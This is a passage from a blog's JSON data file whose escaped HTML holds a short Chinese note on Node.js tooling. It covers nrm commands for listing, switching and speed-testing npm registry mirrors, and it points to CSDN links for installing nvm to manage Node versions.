nrm</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 安装 nrm 源管理工具</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nrm <span class=\"token function\">ls</span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 查看可选的源</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>nrm use <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 切换源</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>nrm <span class=\"token builtin class-name\">test</span>     </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 测试速度</span></pre></td></tr></table></figure><h1 id=\"nvm-node多版本管理\"><a class=\"anchor\" href=\"#nvm-node多版本管理\">#</a> nvm node 多版本管理</h1>\n<p>安装和使用参考<a href=\"http://t.csdnimg.cn/B42dl\">这里</a></p>\n<blockquote>\n<p>参考链接<br />\n<a href=\"http://t.csdnimg.cn/WNDXm\"> http://t.csdnimg.cn/WNDXm</a></p>\n</blockquote>\n",
            "tags": [
                "关于shokaX",
                "daily",
                "nodejs"
            ]
        }
    ]
}